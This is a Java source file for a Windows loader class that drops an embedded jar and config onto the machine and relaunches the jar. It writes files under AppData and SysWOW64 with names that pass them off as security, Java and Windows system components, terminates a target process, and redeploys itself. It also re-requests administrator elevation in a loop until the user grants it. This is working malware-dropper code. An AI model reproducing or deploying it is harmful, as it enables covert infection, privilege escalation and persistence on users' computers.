import com.sun.jna.WString;
import com.sun.jna.platform.win32.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import static com.sun.jna.platform.win32.WinDef.MAX_PATH;

public class Loader1 {
    public static InputStream data = Loader1.class.getResourceAsStream("resources/Data.cfg");
    public static InputStream jar = Loader1.class.getResourceAsStream("resources/me.wtf");

    public static void run(String cmd) throws IOException {
        if(!cmd.equals("first")) {
            int PID = Integer.parseInt(cmd);
            File file = new File(getPath1() + "\\javaw.jar");
            File file1 = new File(getPath1() + "\\360Security.ini");
            File file2 = new File(getWindowsPath() + "\\Java(TM) Platform SE binary.jar");
            File file3 = new File(getWindowsPath1() + "\\WindowsConfig.ini");
            WinNT.HANDLE handle = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS, false, PID);
            if (Kernel32.INSTANCE.TerminateProcess(handle, 0)) {
                file.delete();
                file1.delete();
                file2.delete();
                file3.delete();
                createConfig1();
                createFile1(file);
                createProcess1();
            }
        }else {
            try {
                File file = new File(getPath1() + "\\javaw.jar");
                char[] chars = new char[MAX_PATH];
                Class clazz = new MyClassLoader().loadClass("LoadKernel32");
                Field field = clazz.getDeclaredField("instance");
                Object obj = field.get(null);
                Method method = clazz.getDeclaredMethod("GetWindowsDirectoryW",char[].class,int.class);
                method.invoke(obj,chars,MAX_PATH);
                LoadKernel32.instance.GetWindowsDirectoryW(chars, MAX_PATH);
                File file1 = new File(new String(chars).trim() + "\\SysWOW64\\WindowsConfig\\WindowsConfig.ini");
                if (!file1.exists()) {
                    createConfig1();
                    createFile1(file);
                    createProcess1();
                } else {
                    System.exit(0);
                }
            }catch (Exception e) {
            }
        }
    }
    public static void createProcess1() {
        WinDef.INT_PTR int_ptr = Shell32.INSTANCE.ShellExecute(null,"runas",System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar " + getPath1() + "\\javaw.jar",null,1);
        while (int_ptr.intValue() <= 32) {
            int_ptr = Shell32.INSTANCE.ShellExecute(null,"runas",System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar " + getPath1() + "\\javaw.jar",null,1);
        }
    }

    public static void createFile1(File file) {
        try {
            file.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            byte[] bytes = new byte[1024];
            int len = 0;
            while ((len = jar.read(bytes))!=-1) {
                fileOutputStream.write(bytes,0,len);
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static String getWindowsPath() {
        char[] chars = new char[MAX_PATH];
        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsSettings");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
    public static String getWindowsPath1() {
        char[] chars = new char[MAX_PATH];
        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsConfig");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
    public static void createConfig1() {
        try {
            File file = new File(getPath1() + "\\360Security.ini");
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            int len = 0;
            byte[] bytes = new byte[256];
            while ((len = data.read(bytes))!=-1) {
                fileOutputStream.write(bytes,0,len);
            }
            fileOutputStream.close();
        }catch (Exception e) {
        }
    }
    public static String getPath1(){
        File file = new File(System.getProperty("user.home") + "\\AppData\\SetUp");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
}